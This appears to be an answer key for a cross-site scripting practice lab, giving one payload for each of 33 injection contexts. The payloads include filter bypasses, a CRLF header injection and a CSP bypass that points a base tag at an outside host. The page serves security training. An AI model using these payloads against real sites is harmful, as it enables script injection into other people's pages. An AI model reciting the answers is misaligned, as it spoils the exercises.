<h3>Exercise 01: Injection in Title Tag</h3>
<p>This exercise involves injecting malicious code into the <code>&lt;title&gt;</code> tag to execute an XSS attack.</p>
<p><b>Answer:</b> <code>&lt;/title&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 02: Injection in Noscript Tag</h3>
<p>The injection is placed inside the <code>&lt;noscript&gt;</code> tag to trigger an XSS payload when the script is disabled.</p>
<p><b>Answer:</b> <code>&lt;/noscript&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 03: Injection in Style Tag</h3>
<p>Injecting XSS payload into the <code>&lt;style&gt;</code> tag.</p>
<p><b>Answer:</b> <code>&lt;/style&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 04: Filtered Injection Inside Event Handler</h3>
<p>In this case, the injection involves escaping characters within an event handler, bypassing filters.</p>
<p><b>Answer:</b> <code>%26apos;-alert(1)-%26apos;</code></p>

<h3>Exercise 05: Injection in Regular Tags</h3>
<p>Here, the injection is placed inside a regular HTML tag such as <code>&lt;svg&gt;</code>.</p>
<p><b>Answer:</b> <code>&lt;svg onload=alert(1)&gt;</code></p>

<h3>Exercise 06: Injection in Attribute Value – Double Quote Delimiter</h3>
<p>This injects a payload by breaking out of a double-quoted attribute value.</p>
<p><b>Answer:</b> <code>"&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 07: Injection in Attribute Value – Single Quote Delimiter</h3>
<p>Injecting a payload by breaking out of a single-quoted attribute value.</p>
<p><b>Answer:</b> <code>'&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 08: Filtered Injection in Attribute Value – Double Quote Delimiter</h3>
<p>This example demonstrates how to inject an XSS payload when certain filters are in place.</p>
<p><b>Answer:</b> <code>"autofocus/onfocus="alert(1)</code></p>

<h3>Exercise 09: Filtered Injection in Attribute Value – Single Quote Delimiter</h3>
<p>Similar to Exercise 08, but for single-quoted attribute values with filters applied.</p>
<p><b>Answer:</b> <code>'autofocus/onfocus='alert(1)</code></p>

<h3>Exercise 10: Injection in Textarea Tag</h3>
<p>Injection in the <code>&lt;textarea&gt;</code> tag to trigger XSS.</p>
<p><b>Answer:</b> <code>&lt;/textarea&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 11: Injection in Script Tag – Single Quote Delimiter</h3>
<p>Injecting a payload into a JavaScript block, using a single-quote delimiter.</p>
<p><b>Answer:</b> <code>&lt;/script&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 12: Injection in Script Tag – Double Quote Delimiter</h3>
<p>This payload uses a double-quote delimiter within a <code>&lt;script&gt;</code> tag to inject XSS.</p>
<p><b>Answer:</b> <code>&lt;/script&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 13: Injection in Javascript Variable – Single Quote Delimiter</h3>
<p>Injecting malicious code into a JavaScript variable using single quotes.</p>
<p><b>Answer:</b> <code>'-alert(1)-'</code></p>

<h3>Exercise 14: Injection in Javascript Variable – Double Quote Delimiter</h3>
<p>Similar to Exercise 13, but using double quotes in the injection.</p>
<p><b>Answer:</b> <code>"-alert(1)-"</code></p>

<h3>Exercise 15: Filtered Injection in Javascript Variable – Single Quote Delimiter</h3>
<p>Bypassing filters in a JavaScript variable declaration with single quotes.</p>
<p><b>Answer:</b> <code>\'-alert(1)//</code></p>

<h3>Exercise 16: Filtered Injection in Javascript Variable – Double Quote Delimiter</h3>
<p>Filtered XSS injection using double quotes inside a JavaScript variable.</p>
<p><b>Answer:</b> <code>\"-alert(1)//</code></p>

<h3>Exercise 17: Injection in Script Tag – Backticks Delimiter</h3>
<p>Using backticks in a JavaScript <code>&lt;script&gt;</code> block to inject XSS payloads.</p>
<p><b>Answer:</b> <code>&lt;/script&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 18: Injection in Javascript Variable – Backticks Delimiter</h3>
<p>Injecting payloads into JavaScript variables using backticks.</p>
<p><b>Answer:</b> <code>`-alert(1)-`</code></p>

<h3>Exercise 19: Filtered Injection in Javascript Variable – Backticks Delimiter</h3>
<p>Filtered XSS injection using backticks in a JavaScript variable.</p>
<p><b>Answer:</b> <code>\`-alert(1)//</code></p>

<h3>Exercise 20: Filtered Injection in Javascript Variable – Backticks Delimiter</h3>
<p>Similar to Exercise 19, using backticks and a filter bypass for JavaScript variables.</p>
<p><b>Answer:</b> <code>${alert(1)}</code></p>

<h3>Exercise 21: Validated Injection in HTTP Reference</h3>
<p>Injecting XSS via an HTTP reference, often validated incorrectly by the system.</p>
<p><b>Answer:</b> <code>javascript://%250Aalert(1)//?1</code> (click in KNOXSS glitch)</p>

<h3>Exercise 22: Injection in Iframe Tag</h3>
<p>This involves injecting a payload into an <code>&lt;iframe&gt;</code> tag to execute XSS.</p>
<p><b>Answer:</b> <code>"onload="alert(1) or ">&lt;/iframe&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 23: Injection in HTTP Header</h3>
<p>Injecting malicious payloads into HTTP headers to trigger a client-side XSS attack.</p>
<p><b>Answer:</b> <code>1%0D%0AContent-Type:text/html%0D%0A&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 24: Filtered Double Injection in Javascript Variable</h3>
<p>Filtered injection, where the attacker must use multiple injections to bypass filters.</p>
<p><b>Answer:</b> <code>/alert(1)//\</code></p>

<h3>Exercise 25: Injection in Javascript DOM – Document Sink</h3>
<p>Injection into the Document Object Model (DOM) sink, affecting the document structure.</p>
<p><b>Answer:</b> <code>&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 26: Injection in Javascript DOM – Location Sink</h3>
<p>This involves injecting into the DOM's location sink to trigger the XSS payload.</p>
<p><b>Answer:</b> <code>javascript:alert(1)</code></p>

<h3>Exercise 27: Injection in Javascript DOM – Execution Sink</h3>
<p>This focuses on injecting into the execution flow of the DOM for XSS.</p>
<p><b>Answer:</b> <code>alert(1)</code></p>

<h3>Exercise 28: Injection in HTML Comments</h3>
<p>Injecting an XSS payload into HTML comments to execute the payload.</p>
<p><b>Answer:</b> <code>-->&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 29: Filtered Injection in HTML Comments</h3>
<p>A filtered version of Exercise 28, requiring bypass techniques.</p>
<p><b>Answer:</b> <code>&lt;!--&gt;&lt;svg/onload=alert(1)--&gt;</code></p>

<h3>Exercise 30: Filtered Injection in Javascript DOM – Document Sink</h3>
<p>Similar to Exercise 25, but with filters applied, requiring specific bypass techniques.</p>
<p><b>Answer:</b> <code>\74img/src/onerror=alert(1)\76</code></p>

<h3>Exercise 31: Injection in Script Tag With Header</h3>
<p>Injecting XSS payloads inside the <code>&lt;script&gt;</code> tag, along with HTTP headers.</p>
<p><b>Answer:</b> <code>curl -H 'x:&lt;/script&gt;&lt;svg/onload=alert(1)&gt;' https://brutelogic.com.br/gym.php?[random-string-here]</code></p>

<h3>Exercise 32: Injection in URL</h3>
<p>This involves manipulating a URL to inject a payload that triggers an XSS attack.</p>
<p><b>Answer:</b> <code>https://brutelogic.com.br/gym.php/"&gt;&lt;svg/onload=alert(1)&gt;</code></p>

<h3>Exercise 33: Injection Bypassing CSP (Content Security Policy)</h3>
<p>This demonstrates bypassing a Content Security Policy (CSP) to execute XSS.</p>
<p><b>Answer:</b> <code>?CSP&amp;p05=&lt;base/href=//X55.is&gt;</code></p>
